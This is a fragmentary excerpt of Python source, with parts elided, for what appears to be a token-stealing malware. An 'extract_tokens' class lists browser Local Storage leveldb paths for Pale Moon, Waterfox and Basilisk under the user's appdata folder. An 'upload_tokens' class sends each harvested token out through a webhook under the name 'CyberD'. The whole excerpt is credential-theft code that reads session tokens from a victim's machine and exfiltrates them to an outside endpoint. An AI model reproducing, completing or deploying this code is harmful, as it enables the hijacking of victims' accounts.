...
class extract_tokens:
    ...
    def extract(self) -> None:
        paths = {
            ...
            'Pale Moon': self.appdata + '\\Moonchild Productions\\Pale Moon\\User Data\\Default\\Local Storage\\leveldb\\',
            'Waterfox': self.appdata + '\\Waterfox\\Profile\\Local Storage\\leveldb\\',
            'Basilisk': self.appdata + '\\Basilisk\\Profiles\\Default\\Local Storage\\leveldb\\',
        }
...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            self.webhook.send(embed=embed, username="CyberD",
